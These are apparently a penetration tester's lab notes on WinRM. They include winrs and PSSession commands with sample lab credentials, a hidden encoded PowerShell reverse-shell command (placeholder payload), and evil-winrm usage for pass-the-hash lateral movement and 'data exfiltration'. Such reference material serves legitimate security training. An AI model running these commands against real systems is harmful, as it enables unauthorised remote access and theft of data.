# Windows Remote Management (WinRM)

WinRM is the Microsoft version of the WS-Management protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP.

TCP port 5985 and 5986 (HTTPS)

- <https://en.wikipedia.org/wiki/WS-Management>


Is a Windows remote management protocol that can be used to facilitate remote access with Windows systems.

WinRM is typically used in the following ways:
- Remotely access and interact with Windows hosts on a local network.
- Remotely access and execute commands on Windows systems on the internet.
- Manage and configure Windows systems remotely.

WinRM implements access control and security for communication between systems through various forms of authentication.


*For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.*










## WinRM
```
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
# Output:
FILES04
corp\jen
```


To convert this technique into a full lateral movement scenario, we just need to replace the previous commands with a base64 encoded reverse-shell.

```
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e [ENCODED SHELL]"
```



### PSSession

PowerShell also has WinRM built-in capabilities called PowerShell remoting, which can be invoked via the New-PSSession cmdlet by providing the IP of the target host along with the credentials in a credential object format.

```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
```
To interact with the session ID 1 we created, we can issue the Enter-PSSession cmdlet followed by the session ID:
```
Enter-PSSession 1
whoami
hostname
# Output:
corp\jen
FILES04
```




#### More commands

Execute a Command in the PSSession: Use Invoke-Command to run a command on the remote machine using the session you created.
```
# Execute a command on the remote computer
Invoke-Command -Session $session -ScriptBlock { Get-Process }

```


Interact with the Remote Session: You can also enter the session to interact with it directly.
```
# Enter the remote session
Enter-PSSession -Session $session

```


Exit and close the session:

```
# Exit the remote session
Exit-PSSession

# Remove the PSSession
Remove-PSSession -Session $session


```





















## Evil-Winrm

- <https://github.com/Hackplayers/evil-winrm>

We can also utilize a ruby script called `evil-winrm` to obtain a command shell session on the target system.



```
evil-winrm -i [TARGET IP] -u [USERNAME] -p [PASSWORD]
evil-winrm -i 10.129.136.91 -u administrator -p badminton


> menu



# Upload and download files
evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> -s "source" -d "dest"
evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> -g "source" -d "dest"


# Script execution
evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> -s "powershell_script.ps1"



# Lateral movement
evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> -smb <TARGET_IP> -h <HASH>


# Data exfiltration
Compress-Archive -Path "data_directory" -DestinationPath "exfiltrated_data.zip"

evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> -g "exfiltrated_data.zip" -d "dest"


```


























## MSF

auxiliary/scanner/winrm/winrm_auth_methods
auxiliary/scanner/winrm/winrm_login
auxiliary/scanner/winrm/winrm_cmd

exploit/windows/winrm/winrm_script_exec
	set FORCE_VBS true